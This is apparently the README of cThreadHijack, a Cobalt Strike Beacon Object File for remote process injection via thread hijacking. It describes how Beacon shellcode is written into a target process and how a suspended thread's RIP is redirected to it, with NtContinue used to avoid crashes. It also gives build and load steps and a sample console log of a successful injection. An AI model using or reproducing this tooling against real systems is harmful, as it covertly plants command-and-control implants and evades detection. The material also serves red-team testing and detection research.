## cThreadHijack
```
     ___________.__                              .______ ___ .__     __               __    
  ___\__    ___/|  |_________   ____ _____     __| _/   |   \|__|   |__|____    ____ |  | __
_/ ___\|    |   |  |  \_  __ \_/ __ \\__  \   / __ /    ~    \  |   |  \__  \ _/ ___\|  |/ /
\  \___|    |   |   Y  \  | \/\  ___/ / __ \_/ /_/ \    Y    /  |   |  |/ __ \\  \___|    < 
 \___  >____|   |___|  /__|    \___  >____  /\____ |\___|_  /|__/\__|  (____  /\___  >__|_ \
     \/              \/            \/     \/      \/      \/    \______|    \/     \/     \/
```
Beacon Object File (BOF) for remote process injection, via thread hijacking, without spawning a remote thread. cThreadHijack works by injecting raw Beacon shellcode, generated via a user-supplied listener argument, into a remote process, defined by the user-supplied PID argument, via `VirtualAllocEx` and `WriteProcessMemory`. Then, instead of spawning a new remote thread via `CreateRemoteThread` or other APIs, cThreadHijack identifies the first enumerated thread in the target process, suspends it, and retrieves the contents of the thread's CPU state via a `CONTEXT` structure. Then, the RIP register member of the `CONTEXT` structure (on 64-bit systems) is manipulated to point to the address of the aforementioned remote Payload. Prior to execution, a routine is added to wrap the Beacon shellcode inside of a call to `CreateThread` - giving Beacon its own thread to work in, with this thread being locally spawned, versus being spawned remotely. The `CreateThread` routine is also wrapped in an `NtContinue` function call routine, allowing restoration of the previously hijacked thread without crashing the remote process. Beacon payloads for cThreadHijack are generated with a 'thread' exit function, allowing process continuation after the Beacon has been exited. Beacon listener names, when containing a space, must be placed in quotes.

### BUILDING: ###
1. On a Windows machine, open a `x64 Native Tools Command Prompt for VS` prompt. This can be done by pressing the Windows key and typing `x64 Native Tools` and selecting the prompt.
2. Change directory to `C:\path\to\cThreadHijack`.
3. `nmake -f Makefile.msvc build`
4. Load cThreadHijack.cna through the Cobalt Strike `Script Console` with `load /path/to/cThreadHijack.cna`

### USAGE: ###
`cThreadHijack PID LISTENER_NAME`

```
beacon> cThreadHijack 7340 TESTING
[+] host called home, sent: 268433 bytes
[+] received output:
[+] Target process PID: 7340

[+] received output:
[+] Opened a handle to PID 7340

[+] received output:
[+] Found a thread in the target process! Thread ID: 10212

[+] received output:
[+] Suspending the targeted thread...

[+] received output:
[+] Wrote Beacon shellcode to the remote process!

[+] received output:
[+] Virtual memory for CreateThread and NtContinue routines allocated at 0x201f4ab0000 inside of the remote process!

[+] received output:
[+] Size of NtContinue routine: 64 bytes
[+] Size of CONTEXT structure: 1232 bytes
[+] Size of stack alignment routine: 4
[+] Size of CreateThread routine: 64
[+] Size of shellcode: 261632 bytes

[+] received output:
[+] Wrote payload to buffer to previously allocated buffer inside of!

[+] received output:
[+] Current RIP: 0x7ffa55df69a4

[+] received output:
[+] Successfully pointed the target thread's RIP register to the shellcode!

[+] received output:
[+] Current RIP: 0x201f4ab0000

[+] received output:
[+] Resuming the thread! Please wait a few moments for the Beacon payload to execute...
```

